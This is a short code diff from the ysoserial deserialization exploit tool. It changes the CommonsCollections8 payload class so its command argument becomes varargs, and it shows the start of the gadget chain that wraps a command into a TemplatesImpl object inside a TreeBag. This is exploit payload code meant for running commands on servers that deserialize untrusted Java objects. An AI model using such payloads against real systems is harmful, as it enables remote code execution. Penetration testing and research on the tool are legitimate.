@@ -30,8 +30,8 @@ import ysoserial.payloads.util.Reflections;
 @Authors({ Authors.NAVALORENZO })
 public class CommonsCollections8 extends PayloadRunner implements ObjectPayload<TreeBag> {
 
-    public TreeBag getObject(final String command) throws Exception {
-        Object templates = Gadgets.createTemplatesImpl(command);
+    public TreeBag getObject(final String ... command) throws Exception {
+        Object templates = Gadgets.createTemplatesImpl(command[0]);
 
         // setup harmless chain
         final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
